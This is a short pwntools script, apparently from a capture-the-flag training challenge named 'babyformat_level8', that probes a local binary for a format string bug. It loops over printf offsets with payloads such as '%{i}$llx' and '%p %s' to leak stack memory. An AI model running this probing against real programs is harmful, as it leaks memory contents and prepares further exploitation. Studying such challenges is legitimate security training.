
from pwn import *

context.log_level = 'critical'
BINARY = '/challenge/babyformat_level8'

# for i in range(2, 50):
#     p = process(BINARY)
#     p.sendline('AAAA %{}$p %{}$s'.format(i,i))
#     # p.recvuntil(b"Your input is:")
#     print(p.recvline())
#     # print(b'%02d: '%(i) + p.recvline()[:-1]) 
#     p.close()
# print('loop completed')


for i in range(200):
    with process('/challenge/babyformat_level8') as p:
        p.sendline(f'YEP%{i}$llxYEP'.encode())
        val = p.recvall().split(b'YEP')[1]
        print(f"printf offset: {i}, value: {val}")